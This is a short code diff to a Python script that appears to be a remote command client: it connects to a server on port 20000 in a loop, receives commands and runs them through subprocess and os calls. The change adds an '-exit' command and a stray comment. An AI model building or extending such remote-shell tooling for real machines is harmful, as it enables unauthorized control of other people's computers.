@@ -2,6 +2,7 @@ import socket
 from subprocess import check_output, CalledProcessError
 from pickle import dumps
 from os import getlogin, getenv, startfile, system, chdir, getcwd
+from sys import exit
 
 
 class Socket:
@@ -72,6 +73,10 @@ class Socket:
                 return
             # self.send_msg(f"Changed directory to {path}")
             return
+
+        # Exit
+        elif "-exit" in cmd[0:5]:
+            exit()
 
         # Normal cmd command stuff
         else:
@@ -155,5 +160,8 @@ while True:
         connection.connect_to_server(socket.gethostname(), 20000)
     while connection.established:
         connection.receive_command()
+
+
+# Change hard drives
 
 
